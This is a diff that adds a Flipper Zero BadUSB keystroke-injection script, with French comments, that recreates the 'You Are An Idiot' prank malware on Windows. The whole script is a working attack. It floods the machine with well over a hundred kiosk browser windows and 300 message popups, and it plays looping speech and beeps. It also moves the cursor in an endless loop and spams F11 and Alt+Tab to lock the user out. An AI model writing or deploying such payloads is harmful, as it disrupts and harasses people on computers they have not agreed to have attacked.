@@ -1,0 +1,93 @@
+REM =====================================================================
+REM YOU ARE AN IDIOT - Flipper Zero 2026 VIRUS MODE ULTRA CHAOS ☺☺☺ HAHAHA
+REM Gros virus vibe : flood total, son en boucle, popups x300, curseur fou
+REM Vidéo son: https://www.youtube.com/watch?v=b2pD0B9Rfps
+REM =====================================================================
+
+DELAY 1500
+GUI r
+DELAY 100
+
+REM Phase 0 : Ouvre la vidéo son en kiosk MAX (premier coup)
+STRING powershell -nop -w 1 -c "0..8 | % { Start-Process msedge '--kiosk https://www.youtube.com/watch?v=b2pD0B9Rfps --edge-kiosk-type=fullscreen --autoplay-policy=no-user-gesture-required --mute-audio=false' }"
+ENTER
+DELAY 400
+
+REM Phase 1 : youareanidiot.cc en FLOOD MASSIF (multi fenêtres)
+GUI r
+DELAY 60
+STRING powershell -nop -w 1 -c "0..60 | % { Start-Process msedge '--kiosk https://youareanidiot.cc --edge-kiosk-type=fullscreen --disable-pinch --no-first-run' -WindowStyle Maximized }"
+ENTER
+DELAY 300
+
+GUI r
+DELAY 50
+STRING powershell -nop -w 1 -c "0..50 | % { Start-Process chrome '--kiosk https://youareanidiot.cc --start-fullscreen --autoplay-policy=no-user-gesture-required' }"
+ENTER
+DELAY 250
+
+GUI r
+DELAY 50
+STRING powershell -nop -w 1 -c "0..40 | % { Start-Process firefox -kiosk https://youareanidiot.cc }"
+ENTER
+DELAY 200
+
+REM Phase 2 : Vidéo son en boucle supplémentaire + fallback PNG
+GUI r
+DELAY 70
+STRING powershell -nop -w 1 -c "0..15 | % { Start-Process msedge '--kiosk https://www.youtube.com/watch?v=b2pD0B9Rfps --edge-kiosk-type=fullscreen' }"
+ENTER
+DELAY 300
+
+GUI r
+DELAY 60
+STRING powershell -nop -w 1 -c "0..20 | % { Start-Process msedge '--kiosk https://static.wikia.nocookie.net/windows/images/a/a2/YAAIWii.png --edge-kiosk-type=fullscreen' }"
+ENTER
+
+REM Phase 3 : SPAM MSGBOX VIRUS STYLE x300+
+GUI r
+DELAY 80
+STRING cmd /c "for /l %x in (1,1,300) do start msg * \"YOU ARE AN IDIOT ☺☺☺ HAHAHAHA ☺☺☺ IDIOT FOREVER IDIOT IDIOT HAHA GET REKT\""
+ENTER
+DELAY 400
+
+REM Phase 4 : SON CHAOS MAX - TTS grave + répétitif + beeps aigus
+GUI r
+DELAY 90
+STRING powershell -c "Add-Type -AssemblyName System.Speech; $s=New-Object System.Speech.Synthesis.SpeechSynthesizer; $s.Rate=-4; $s.Volume=100; 1..12|%{ $s.Speak('You are an IDIOT ha ha ha ha ha ha ha'); Start-Sleep -m 400 }"
+ENTER
+DELAY 300
+
+GUI r
+DELAY 70
+STRING powershell -c "1..40 | % { [console]::beep(1200,150); [console]::beep(800,200); Start-Sleep -m 100 }"
+ENTER
+
+REM Sons erreur + recycle bin flood
+GUI r
+DELAY 80
+STRING powershell -c "1..30 | % { explorer.exe shell:RecycleBinFolder; Start-Sleep -m 120 }"
+ENTER
+
+REM Phase 5 : Curseur fou (mouvement aléatoire PowerShell)
+GUI r
+DELAY 100
+STRING powershell -c "[void][Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms'); $r=New-Object System.Random; while($true){ [Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point(($r.Next(0,1920)),($r.Next(0,1080))); Start-Sleep -m 80 }"
+ENTER
+DELAY 200
+
+REM Phase 6 : F11 + Alt+Tab spam pour bloquer l'utilisateur
+GUI r
+DELAY 70
+STRING powershell -c "[void][Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms');1..20|%{ [Windows.Forms.SendKeys]::SendWait('{F11}'); [Windows.Forms.SendKeys]::SendWait('%{TAB}'); Start-Sleep -m 150 }"
+ENTER
+
+REM Dernier coup : ré-ouvre tout en maximisé
+GUI r
+DELAY 80
+STRING powershell -c "Start-Process 'https://www.youtube.com/watch?v=b2pD0B9Rfps' -WindowStyle Maximized; Start-Sleep -m 300; [Windows.Forms.SendKeys]::SendWait('{F11}'); Start-Sleep -m 200; [Windows.Forms.SendKeys]::SendWait('{F11}')"
+ENTER
+
+REM Fin - le PC est possédé ☺☺☺
+DELAY 2000
+STRING exit
